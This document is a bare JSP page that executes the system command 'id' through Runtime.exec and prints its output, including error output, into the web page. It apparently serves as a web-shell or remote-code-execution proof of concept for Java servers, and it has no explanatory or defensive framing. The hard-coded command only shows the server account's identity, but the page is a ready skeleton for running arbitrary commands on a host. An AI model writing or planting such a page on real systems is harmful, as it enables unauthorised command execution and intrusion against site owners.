<%@ page language="java" 
   import= "java.io.*,  
   java.util.*"  
   contentType="text/html;charset=EUC-KR" session="false"  
%> 

<html> 
<% 

    String command = "id";  
    int lineCount = 0; 
    String line=""; 

    Runtime rt = Runtime.getRuntime(); 
    Process ps = null; 

    try{ 
      ps = rt.exec(command); 

      BufferedReader br = 
            new BufferedReader( 

                    new InputStreamReader( 

                          new SequenceInputStream(ps.getInputStream(), ps.getErrorStream()))); 

             

      while((line = br.readLine()) != null){ 
%> 
    <%=line%><br> 
<% 
      } 
      br.close(); 

   }catch(IOException ie){ 
      ie.printStackTrace(); 
   }catch(Exception e){ 
      e.printStackTrace(); 
   } 
%> 
</html> 
